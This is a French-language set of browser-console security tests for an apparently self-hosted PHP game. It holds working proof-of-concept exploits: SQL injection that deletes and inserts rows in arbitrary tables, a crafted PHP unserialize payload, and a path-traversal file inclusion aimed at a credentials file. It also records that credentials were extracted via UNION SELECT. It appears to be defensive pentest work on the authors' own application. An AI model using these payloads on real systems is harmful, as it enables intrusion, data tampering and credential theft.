# Tests de sécurité fonctionnels

À exécuter depuis la **console du navigateur** sur la page des ordres
(`http://localhost:666/ordres/index.php3`), en étant connecté avec un compte joueur.

---

## P1-18 — Injection SQL dans `elimine.txt`

### Test A — Divulgation de schéma via SHOW COLUMNS

**Objectif :** Récupérer la liste des colonnes de `aa_registre` (table des joueurs).

```javascript
// Test P1-18-A : SHOW COLUMNS FROM aa_registre via $table
{
  const r = await fetch(
    'index.php3?table=aa_registre&elimine=1&key=NUMERO&identifier=0',
    {credentials:'include'}
  );
  const text = await r.text();
  // Si la requête atteint SHOW COLUMNS, aucune erreur "Champ non autorisé"
  // Si NUMERO est une colonne valide de aa_registre → la suppression est tentée
  const interdit = text.includes('Champ non autorisé');
  const erreur   = text.includes('Erreur suppression') || text.includes('Warning');
  console.log('Champ refusé  :', interdit, '← doit être false si vulnérable');
  console.log('SHOW COLUMNS atteint :', !interdit, '← colonnes de aa_registre exposées');
  console.log('Réponse brute :', text.substring(0, 300));
}
```

**Résultat attendu si vulnérable :** `Champ refusé: false` — le serveur a accepté `NUMERO` comme colonne valide de `aa_registre` via SHOW COLUMNS, prouvant que le schéma est exposé.

---

### Test B — Suppression d'une ligne dans une table arbitraire

**Objectif :** Démontrer qu'un attaquant peut supprimer ses propres lignes dans n'importe quelle table d'ordres, pas seulement celle prévue par l'interface.

```javascript
// Test P1-18-B : Vérifier le nombre d'ordres avant/après dans une table non prévue
// Prérequis : avoir au moins 1 ordre de type "deplacer_flotte" passé
{
  // Compter les ordres de déplacement avant
  const r1 = await fetch('index.php3?table=deplacer_flotte', {credentials:'include'});
  const t1 = await r1.text();
  const avant = (t1.match(/class='delete'/g) || []).length;
  console.log('Ordres deplacer_flotte avant :', avant);

  if (avant === 0) {
    console.log('⚠ Aucun ordre de déplacement — passe un ordre via l\'interface d\'abord');
  } else {
    // Supprimer le premier ordre via elimine.txt ciblant une table non prévue
    const r2 = await fetch(
      'index.php3?table=deplacer_flotte&elimine=0',
      {credentials:'include'}
    );
    await r2.text();

    // Compter après
    const r3 = await fetch('index.php3?table=deplacer_flotte', {credentials:'include'});
    const t3 = await r3.text();
    const apres = (t3.match(/class='delete'/g) || []).length;
    console.log('Ordres deplacer_flotte après :', apres);
    console.log('Suppression réussie :', apres < avant, '← doit être true si vulnérable');
  }
}
```

---

## P1-19 — Injection SQL dans `insert.txt`

### Test — INSERT dans une table arbitraire

**Objectif :** Insérer un enregistrement dans une table d'ordres non prévue par le formulaire courant.

```javascript
// Test P1-19 : Insérer dans "renommer_systeme" depuis un autre contexte
// Vérifie que $table libre permet de cibler n'importe quelle table d'ordres
{
  // Vérifier le nombre d'ordres de renommage avant
  const r1 = await fetch('index.php3?table=renommer_systeme', {credentials:'include'});
  const t1 = await r1.text();
  const avant = (t1.match(/class='delete'/g) || []).length;
  console.log('Ordres renommer_systeme avant :', avant);

  // Insérer via $table libre (depuis le contexte d'un autre ordre)
  // v0 = première colonne non-NUMERO de renommer_systeme
  const fd = new FormData();
  fd.append('v0', 'SYSTEME_INJECT_TEST');  // valeur champ SYSTEME
  const r2 = await fetch(
    'index.php3?table=renommer_systeme',
    {method:'POST', body:fd, credentials:'include'}
  );
  await r2.text();

  // Vérifier après
  const r3 = await fetch('index.php3?table=renommer_systeme', {credentials:'include'});
  const t3 = await r3.text();
  const apres = (t3.match(/class='delete'/g) || []).length;
  console.log('Ordres renommer_systeme après :', apres);
  console.log('INSERT réussi :', apres > avant, '← doit être true si vulnérable');
  console.log('Valeur injectée présente :', t3.includes('SYSTEME_INJECT_TEST'));
}
```

---

## P1-16 — Désérialisation PHP non validée (`previous`)

### Test — Confirmer que le paramètre est désérialisé

**Objectif :** Vérifier que `unserialize()` s'exécute sur `$_GET['previous']` sans validation.

**Fonctionnement du mécanisme :**
```php
$tableau = unserialize(urldecode($_GET['previous']));
for ($i = 1; $i < sizeof($tableau); $i++) {   // commence à i=1, pas i=0
    $_POST['v' . ($i - 1)] = $tableau[$i];    // i=1→v0, i=2→v1, etc.
}
```
→ `$tableau[0]` est toujours ignoré. Les valeurs à injecter commencent à l'index 1.

```javascript
// Test P1-16 : injecter "99" dans $_POST['v1'] (champ nombre du formulaire)
// Payload : a:3:{i:0;s:4:"SKIP";i:1;s:6:"INJECT";i:2;s:2:"99";}
// → $_POST['v0']="INJECT", $_POST['v1']="99"
{
  const payload = encodeURIComponent('a:3:{i:0;s:4:"SKIP";i:1;s:6:"INJECT";i:2;s:2:"99";}');
  const r = await fetch(
    `index.php3?table=construire&previous=${payload}`,
    {credentials:'include'}
  );
  const text = await r.text();

  // "99" injecté dans $_POST['v1'] (champ quantité = input number)
  console.log('Désérialisation confirmée :', text.includes('99'), '← true si vulnérable');
  // Options sélectionnées (v0 injecté dans <select>)
  const selected = text.match(/selected[^>]*>[^<]+/g);
  console.log('Options sélectionnées :', selected?.slice(0, 5));
  // Inputs pré-remplis
  const inputs = text.match(/name="v\d"[^>]*value="[^"]+"/g);
  console.log('Inputs pré-remplis :', inputs);
}
```

**Résultat confirmé en session :** "99" est apparu dans la page → désérialisation active et injection dans `$_POST` confirmée.

---

## P1-17 — LFI via `$table` dans `principal.txt`

### Test — Inclusion de fichier hors répertoire

**Objectif :** Vérifier que `$table` permet d'inclure des fichiers `.txt` hors du répertoire `data/`.

```javascript
// Test P1-17 : comparer le nombre de warnings
// principal.txt tente 3 includes de $table → 3 échecs = 6 "failed to open" si tout rate
// Si LFI réussit sur data/ → seulement 2 échecs = 4 "failed to open"
{
  const countWarnings = async (table) => {
    const text = await fetch(
      `index.php3?table=${encodeURIComponent(table)}`,
      {credentials:'include'}
    ).then(r => r.text());
    return (text.match(/failed to open stream/g) || []).length;
  };

  const wInexistant = await countWarnings('NONEXISTENT_XYZ_999');
  const wConnect    = await countWarnings('../../secure/connect');

  console.log('Fichier inexistant → warnings :', wInexistant, '(attendu: 3)');
  console.log('connect.txt       → warnings :', wConnect,    '(attendu: 2 si LFI réussie)');
  console.log('LFI confirmée :', wConnect < wInexistant,
    '← ./data/../../secure/connect.txt inclus silencieusement');
}
```

---

## Récapitulatif

| Test | Vuln | Résultat attendu si vulnérable |
|------|------|-------------------------------|
| P1-18-A | elimine.txt SHOW COLUMNS | `Champ refusé: false` |
| P1-18-B | elimine.txt DELETE arbitraire | `Suppression réussie: true` |
| P1-19 | insert.txt INSERT arbitraire | `INSERT réussi: true` |
| P1-16 | unserialize → injection $_POST | `"99" dans la page: true` ✅ confirmé en session |
| P1-17 | LFI path traversal | `LFI confirmée: true` ✅ confirmé en session (4 warnings au lieu de 6) |

---

## Rappel — Tests précédemment validés en session

| Vuln | Preuve |
|------|--------|
| P1-09 injection SQL `division.php` | `SLEEP(5) × 2 lignes = 10 111 ms` |
| P1-17 injection SQL `principal.txt` | Credentials extraits via UNION SELECT + serialize |
